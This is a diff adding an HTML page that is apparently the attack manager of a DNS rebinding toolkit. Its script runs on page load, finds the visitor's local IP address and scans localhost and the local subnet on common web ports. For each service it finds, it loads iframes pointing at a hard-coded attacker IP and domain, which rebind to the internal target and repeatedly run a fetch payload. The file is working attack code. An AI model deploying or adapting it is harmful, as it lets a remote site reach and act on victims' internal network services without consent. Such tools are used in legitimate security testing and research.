@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <title>Singularity of Origin DNS Rebinding Attack Manager</title>
+    <script src="manager.js"></script>
+    <script src=scan-manager.js></script>
+    <meta charset="utf-8">
+    <meta http-equiv="x-dns-prefetch-control" content="off">
+</head>
+
+<body>
+    <script>
+        const attackHostIpAddress = "80.85.86.45";
+        const attackHostDomain = "dynamic.occalis.net";
+        const addrSpec = `127.0.0.1,0.0.0.0`;
+        const portSpec = '80,8080-8090';
+        const rebindingStrategy = "FromQueryFirstThenSecond";
+        //const rebindingStrategy = "FromQueryMultiA";
+        const payload = "payload-simple-fetch-get.html";
+        const interval = "20";
+
+        let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
+
+        function resultFn(result) {
+            console.log(result);
+            document.getElementById("activity").innerHTML += JSON.stringify(result, null, 4) + "<br/>";
+            attackTarget(result.target.address, result.target.port)
+
+        }
+
+        function doneFn(results) {
+            document.getElementById("activity").innerHTML += "Done.<br/>";
+            setTimeout(function () {
+                sm.shutDown();
+            }, 3000);
+
+        }
+
+        function getLocalIpAddressThenScan2() {
+            sm = ScanManager();
+
+            getLocalIpAddress()
+                .then(address => {
+                        const range = `${address.split('.', 3).join('.')}.1-255`;
+                        sm.run(`${addrSpec},${range}`, portSpec, resultFn, doneFn);
+                    },
+                    e => {
+                        console.log(e);
+                        sm.run(`${addrSpec},192.168.1.1-255`, portSpec, resultFn, doneFn);
+
+                    })
+        }
+
+        getLocalIpAddressThenScan2();
+
+        function attackTarget(targetAddress, targetPort) {
+            let self = this;
+            let fid = app.getFrameManager().addFrame(hosturl
+                .replace("%1", attackHostIpAddress)
+                .replace("%2", targetAddress) // replace(/-/g, '--'))
+                .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
+                .replace("%4", rebindingStrategy)
+                .replace("%5", attackHostDomain)
+                .replace("%6", targetPort)
+                .replace("%7", payload + "?rnd=" + Math.random()));
+
+            app.addFrameToDOM(app.getFrameManager().frame(fid));
+            app.getFrameManager().frame(fid).setTimer(setInterval((() => {
+                app.reloadAttackFrame(app.getFrameManager().frame(fid))
+            }), parseInt(interval) * 1000));
+
+        }
+    </script>
+
+    <div id="activity"></div>
+    <div id=attackframes></div>
+    <iframe id=delaydomloadframe src="/delaydomload" class="d-none"></iframe>
+
+</body>
+
+</html>
